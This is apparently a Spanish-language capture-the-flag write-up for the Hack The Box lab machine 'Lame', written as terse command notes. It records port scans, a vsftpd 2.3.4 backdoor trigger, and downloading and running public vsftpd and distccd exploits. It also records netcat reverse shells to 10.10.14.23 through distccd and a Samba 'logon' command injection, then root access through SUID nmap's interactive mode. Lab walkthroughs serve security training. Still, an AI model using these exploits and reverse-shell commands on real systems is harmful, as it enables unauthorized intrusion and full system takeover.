# Lame

IP: 10.10.10.3

## Escaneo

❯ ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=41.0 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 41.042/41.042/41.042/0.000 ms

`nmap -p- --open -T5 -v -n 10.10.10.3 -oN allPorts`

`sudo nmap -p- -sS --min-rate 5000 -vvv --open -Pn -T5 10.10.10.3 -oN allPorts`

### Escaneo de puertos
`sudo nmap -sC -sV -p21,22,139,445,3632 10.10.10.3 -oN targetedPorts`

ftp 10.10.10.3 --> anonymous
ls -lha

- cat targetedPorts | grep -oP '\d{1,5}/tcp.*' 
- searchsploit vsftpd 2.3.4
- buscamos en google --> vsftpd 2.3.4 exploit github

## Exploit ftp
telnet 10.10.10.3 21

- USER yintao:)
- PASS hola123

`sudo nmap -p6200 --open -T5 -v -n 10.10.10.3`

Descargamos el exploit
~~~
cd exploits
wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
python3 vsftpd_234_exploit.py
python3 vsftpd_234_exploit.py 10.10.10.3 21 whoami
~~~

~~~
cat targetedPorts | grep -oP '\d{1,5}/tcp.*'
searchsploit distccd
distccd exploit github
wget exploit
python distccd_rce_CVE.py -t 10.10.10.3 -p 3632 -c whoami
~~~

## Reverse Shell
`nc -nlvp 443`

python distccd_rce_CVE.py -t 10.10.10.3 -p 3632 -c 'nohup nc -e /bin/bash 10.10.14.23 443 &'

~~~
whoami
script /dev/null -c bash
ctrl+z
export TERM=xterm
export SHELL=bash
ctrl+l
stty -a
stty rows 44 columns 187
nano
cd /home 
find \-name user.txt 2>/dev/null
find \-name user.txt 2>/dev/null | xargs head -c 18; echo
~~~
## Escala de privilegios
~~~
uname -a
id
sudo -l 
find \-perm -4000 2>/dev/null
which nmap
nmap --interactive
!sh
whoami
cd /root
ls
~~~

## Explotacion por Samba
En kali 2020 hay que:

Under the global section in "/etc/samba/smb.conf" file and add the following:

`client min protocol = NT1`

~~~
cd nmap
cat targetedPorts | grep -oP '\d{1,5}/tcp.*'
searchsploit samba 3. command execution
searchsploit -x exploits/unix/remote/16320.rb --> x: examinar
smbclient 10.10.10.3 -N --> comprobar recursos compartidos
smbmap -H 10.10.10.3
smbclient //10.10.10.3/tmp -N
dir
smbclient //10.10.10.3/tmp --option='client min protocol=NT1' -N
dir
nc -nlvp 443
smbclient //10.10.10.3/tmp -N
smb: \> logon "/='nohup nc -e /bin/bash 10.10.14.23 443'"
whoami
pwd
script /dev/null -c bash
ctrl+z
ssty raw -echo
export TERM=xterm
export SHELL=bash
~~~



